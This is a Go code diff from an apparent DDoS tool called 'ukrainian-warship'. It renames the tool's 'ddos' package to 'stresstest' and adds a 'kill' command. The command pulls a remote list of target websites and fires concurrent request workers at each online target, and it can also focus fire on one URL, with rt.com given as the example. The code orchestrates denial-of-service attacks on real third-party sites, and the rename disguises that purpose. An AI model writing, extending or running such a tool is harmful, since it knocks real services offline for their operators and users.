@@ -19,9 +19,7 @@ import (
 	"fmt"
 	"time"
 
-	"github.com/seedpockets/ukrainian-warship/pkg/ddos"
-
-	"github.com/briandowns/spinner"
+	"github.com/seedpockets/ukrainian-warship/pkg/stresstest"
 
 	"github.com/seedpockets/ukrainian-warship/pkg/api_client"
 
@@ -37,104 +35,88 @@ var killCmd = &cobra.Command{
 Periodically updates target list and evenly spreads load among online
 targets.
 
-Default worker amount is 512 divided by number of targets.`,
+Default worker amount is 24 divided by number of targets.`,
 	Run: func(cmd *cobra.Command, args []string) {
+		singleTarget, _ := cmd.Flags().GetString("target")
+		debug, _ := cmd.Flags().GetBool("debug")
 		workers, _ := cmd.Flags().GetInt("workers")
-		AutoKill(workers)
+		refreshRate, _ := cmd.Flags().GetFloat64("refresh")
+		if singleTarget != "" {
+			err := KillSingleTarget(singleTarget, debug)
+			if err != nil {
+				panic(err.Error())
+			}
+		} else {
+			KillAll(workers, refreshRate, debug)
+		}
 	},
 }
 
 func init() {
 	rootCmd.AddCommand(killCmd)
-	killCmd.Flags().Int("workers", 512, "--workers=1024")
+	killCmd.Flags().Int("workers", 64, "--workers=1024 ")
+	killCmd.Flags().String("target", "", "--target=https://ww.rt.com takes aim at a single target")
+	killCmd.Flags().Float64("refresh", 5, "--refresh=10 number of minutes between refreshing target URLs")
+	killCmd.Flags().Bool("debug", false, "--debug=true defaults to false")
 }
 
-func AutoKill(workers int) {
-	//s := make(chan os.Signal, 1)
-	//signal.Notify(s, os.Interrupt)
-	//running := true
-	//// Stop DDoS on Crtl+C
-	//go func() {
-	//	for sig := range s {
-	//		fmt.Println("Caught os signal: ", sig.String())
-	//		fmt.Println("Stopping Brrr...")
-	//		running = false
-	//		for i := range clients {
-	//			clients[i].StopBrrr()
-	//		}
-	//		os.Exit(0)
-	//	}
-	//}()
-	// run and refresh targets every 5 min
-	spin := spinner.New(spinner.CharSets[11], 100*time.Millisecond) // Build our new spinner
-	running := true
-	for running {
-		spin.Start()
-		clients := Kill(workers)
-		fmt.Println("Monitoring accuracy...")
-		refresh := true
-		refreshTime := time.Now().Add(time.Minute * 5).Unix() // refresh targets interval
-		for refresh {
-			if time.Now().Unix() > refreshTime {
-				//for i := range clients {
-				//	fmt.Println("Ukrainian Warship stop brrr...")
-				//	clients[i].StopBrrr()
-				//}
-				clients = nil
-				refresh = false
-			} else {
-				clearScreen()
-				fmt.Println(string(colorGreen) + "Updates targets every 5 min...\n\n" + string(colorReset))
-				fmt.Println("Target")
-				fmt.Println("_________________________________________________________")
-				totalRequests := len(clients) + 1
-				for _, c := range clients {
-					fmt.Println(c.Target)
-				}
-				fmt.Println("Total: ", totalRequests)
-			}
-			time.Sleep(time.Millisecond * 500)
-		}
-		spin.Stop()
-	}
-}
-
-func Kill(workers int) []*ddos.Client {
-	targets, err := getTargets()
+func KillSingleTarget(target string, debug bool) error {
+	warship, err := stresstest.New(target, debug, 0)
 	if err != nil {
-		panic("Could not get targets...")
+		return err
 	}
-	var workersPerURL int
-	if workers == 0 {
-		workersPerURL = 512 / len(targets.Online)
-	} else {
-		workersPerURL = workers / len(targets.Online)
+	warship.FocusFire()
+	return nil
+}
+
+func KillAll(workers int, refreshRate float64, debug bool) {
+	var refreshTimeMinutes = time.Duration(refreshRate)
+	refreshTime := time.Now().Add(time.Minute * refreshTimeMinutes).Unix() // refresh targets interval
+	running := true
+	warships := []*stresstest.Warship{}
+	var totalRequests int64 = 0
+	for running {
+		if len(warships) <= 0 {
+			targets, err := getTargets()
+			if err != nil {
+				fmt.Println("Could not get targets")
+				panic(err.Error())
+			}
+			var w = workers / len(targets.Online)
+			for i := 0; i < len(targets.Online); i++ {
+				warship, err := stresstest.New(targets.Online[i], debug, w)
+				if err != nil {
+					fmt.Println("Failed to start Warship: ", targets.Online[i])
+				}
+				warship.Fire()
+				warships = append(warships, warship)
+			}
+		}
+		clearScreen()
+		fmt.Println(string(colorGreen) + "Updates targets every " + refreshTimeMinutes.String() + " min..." + string(colorReset))
+		fmt.Println("Request\t\tSuccess\t\tTarget")
+		fmt.Println("__________________________________________________________________")
+		for _, v := range warships {
+			fmt.Println(v)
+			totalRequests += v.AmountRequests
+		}
+		fmt.Printf("Total Request: %d", totalRequests)
+		if time.Now().Unix() > refreshTime {
+			fmt.Println("Refreshing targets!")
+			warships = []*stresstest.Warship{}
+			refreshTime = time.Now().Add(time.Minute * refreshTimeMinutes).Unix()
+		}
+		time.Sleep(time.Millisecond * 500)
 	}
-	// Starting Kill command
-	clients := []*ddos.Client{}
-	fmt.Println("Loading canons...")
-	for i := range targets.Online {
-		c := ddos.NewWarship(targets.Online[i], workersPerURL)
-		clients = append(clients, c)
-	}
-	fmt.Println("Ukrainian Warship go brrr...")
-	for i := range clients {
-		clients[i].GoBrrr()
-	}
-	return clients
 }
 
 func getTargets() (*api_client.Targets, error) {
 	clearScreen()
 	fmt.Println("Acquiring targets...")
-	spin := spinner.New(spinner.CharSets[36], 100*time.Millisecond) // Build our new spinner
-	spin.Start()
 	targets, err := api_client.GetTargets()
 	if err != nil {
 		return nil, err
 	}
-	time.Sleep(1 * time.Second) // Run for some time to simulate work
-	spin.Stop()
 	fmt.Println("Done...")
 	return targets, nil
 }
